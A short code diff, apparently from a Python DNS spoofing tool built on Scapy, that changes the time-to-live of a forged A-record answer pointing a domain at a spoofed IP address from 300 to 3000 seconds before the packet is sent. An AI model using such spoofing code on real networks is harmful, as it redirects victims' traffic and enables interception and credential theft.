@@ -48,7 +48,7 @@ class dns:
                 rd=1,
                 ra=1,
                 qd=packet[DNS].qd,
-                an=DNSRR(rrname=domain, type='A', rdata=spoofed_ip, ttl=300)
+                an=DNSRR(rrname=domain, type='A', rdata=spoofed_ip, ttl=3000)
             )
         )
         send(spoofed_packet, verbose=False)
